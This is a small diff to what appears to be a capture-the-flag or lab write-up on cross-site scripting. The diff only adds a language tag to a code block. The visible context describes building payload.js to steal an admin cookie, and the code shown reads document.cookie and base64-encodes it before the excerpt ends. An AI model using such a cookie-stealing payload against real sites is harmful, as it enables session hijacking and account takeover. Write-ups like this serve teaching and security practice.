@@ -11,7 +11,7 @@ vulenrable. Upon testing for XSS, we find out that it is vulnerable to it. The e
 it successfully reaches back to us, so now we can craft a payload that returns the admin cookie.
 
 This is the payload.js:
-```
+```js
 async function getData() {
         var string = document.cookie;
         var encodedString = btoa(string);
